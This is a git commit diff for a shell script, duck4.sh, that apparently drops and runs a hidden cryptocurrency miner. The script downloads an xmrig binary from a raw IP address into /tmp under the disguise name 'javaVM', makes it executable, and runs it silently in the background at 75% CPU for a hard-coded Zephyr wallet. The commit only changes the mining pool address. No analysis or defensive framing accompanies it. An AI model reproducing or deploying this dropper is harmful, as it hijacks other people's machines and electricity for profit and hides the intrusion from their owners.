51eca2942be9072d097c68adb01270cfd4073a64
cronjob <thesunofme1@gmail.com>
2023-11-21 22:19:58 +0700

    Update duck4.sh

--- duck4.sh
+++ duck4.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o 	103.228.74.80:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 	/tmp/javaVM -o 		hk-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
  		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o 103.228.74.80:443 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 		/tmp/javaVM -o hk-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -k --donate-level --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
